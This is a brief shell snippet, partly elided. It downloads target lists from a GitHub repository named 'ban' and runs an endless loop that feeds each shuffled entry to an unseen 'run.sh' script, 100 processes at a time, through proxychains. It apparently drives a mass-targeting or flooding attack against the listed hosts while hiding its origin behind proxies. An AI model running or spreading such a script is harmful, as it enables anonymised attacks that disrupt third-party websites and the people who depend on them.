...
wget https://github.com/imsamurai/ban/raw/master/data/ph_priority2.txt
wget https://github.com/imsamurai/ban/raw/master/data/personal.txt
...
while true; do cat "ph_priority2.txt" | shuf | xargs -r -P 100 -L1 -d '\n' proxychains -q ./run.sh; done;
